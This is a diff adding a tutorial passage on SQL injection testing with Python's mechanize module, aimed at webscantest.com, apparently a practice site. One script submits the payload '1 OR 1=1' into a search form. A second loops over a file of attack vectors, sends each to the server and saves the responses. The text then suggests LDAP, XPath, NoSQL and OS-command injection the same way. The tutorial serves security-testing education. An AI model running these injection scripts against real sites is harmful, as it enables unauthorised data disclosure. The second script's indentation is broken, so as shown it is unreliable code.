@@ -1,0 +1,87 @@
+Injections
+SQL Injection is the method where an attacker may create or alter SQL commands in order to disclose data in the database. This can be effective on an application that takes user input and combines it with static parameters to build a SQL query without proper validation.
+
+Likewise, all types of injection attacks can be done with manipulating input data to the application. With Python, we could inject some attack vectors to the application and analyze the output to verify the possibility of the attack. Mechanize is a very useful Python module for navigating through web forms, which provide a stateful programmatic web-browsing experience with Python.
+
+We could use mechanize to submit forms and analyze the response:
+
+
+
+
+
+import mechanize 
+ # Import module 
+ 
+# Set the URL 
+url = "http://www.webscantest.com/datastore/search_by_id.php" 
+  
+ 
+request = mechanize.Browser() 
+ 
+request.open(url) 
+ 
+ 
+# Selected the first form in the page 
+request.select_form(nr=0) 
+ 
+ 
+# Set the Id  
+request["id"] = "1 OR 1=1" 
+ 
+# Submit the form 
+response = request.submit() 
+ 
+content = response.read() 
+ 
+print content 
+
+
+
+This will print out the response for the POST request. Here we submit an attack vector to break the SQL query and print all the data in the table instead of one row. When testing a website, we have to create many customized scripts like this to test with many similar attack vectors.
+
+So let us rewrite the script to get all the attack vectors from a file and send all of them one by one to the server, and save the output to a file:
+
+
+
+import mechanize 
+ 
+# Set the URL 
+url = "http://www.webscantest.com/datastore/search_by_id.php" 
+ 
+browser = mechanize.Browser() 
+ 
+attackNumber = 1 
+ 
+# Read attack vectors 
+with open('attack-vector.txt') as f: 
+ 
+ 
+    # Send request with each attack vector 
+    for line in f: 
+ 
+         browser.open(url) 
+ 
+   browser.select_form(nr=0) 
+ 
+         browser["id"] = line 
+ 
+         res = browser.submit() 
+ 
+   content = res.read() 
+ 
+      
+      # write the response to file 
+   output = open('response/'+str(attackNumber)+'.txt', 'w') 
+ 
+   output.write(content) 
+ 
+   output.close() 
+ 
+   print attackNumber 
+ 
+   attackNumber += 1 
+
+
+We could check the responses for the requests and identify the possible attacks. For instance, the preceding code sample will provide responses which include the sentence You have an error in your SQL syntax. From this, we could identify that this form may be prone to SQL injection. After that we could exclude the responses which contain an error, as they won't have the required data.
+
+Furthermore, we could write custom scripts to inject LDAP, XPath, or NoSQL queries, OS commands, XML parsers, and all other Injection vectors.
